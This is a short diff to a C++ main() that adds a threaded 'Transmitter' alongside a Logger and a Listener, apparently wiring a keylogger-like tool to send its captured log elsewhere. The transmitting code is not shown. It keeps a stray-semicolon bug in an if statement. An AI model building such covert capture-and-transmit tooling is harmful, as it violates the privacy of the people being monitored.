@@ -3,6 +3,7 @@
 
 #include "pch.h"
 #include "Listener.h"
+#include "Transmitter.h"
 #include <iostream>
 
 using namespace std;
@@ -12,6 +13,11 @@ int main()
 	// Start logger and listener
 	Logger logger;
 	Listener listener(&logger);
+	Transmitter transmitter(&logger);
+
+	// Start Transmitter thread
+	Thread thread(&Transmitter::Start, &transmitter);
+	thread.launch();
 
 	// Test Utilities static methods
 	cout << Utilities::GetCurrentDate() << endl;
@@ -21,7 +27,7 @@ int main()
 	cout << Utilities::GetSystemDir() << endl;
 	
 	// If available load log from file and display it to screen 
-	if(logger.LoadMapFromFile());
+	if(logger.LoadFromFile());
 		cout << logger.GetLog() << endl;
 
 	// Start listening
@@ -30,8 +36,11 @@ int main()
 	// If F1 pressed
 	cout << "EXITING!" << endl;
 
+	// Stop thread
+	transmitter.Stop();
+
 	// Save log to file
-	logger.SaveMapToFile();
+	logger.SaveToFile();
 
 	return 0;
 }
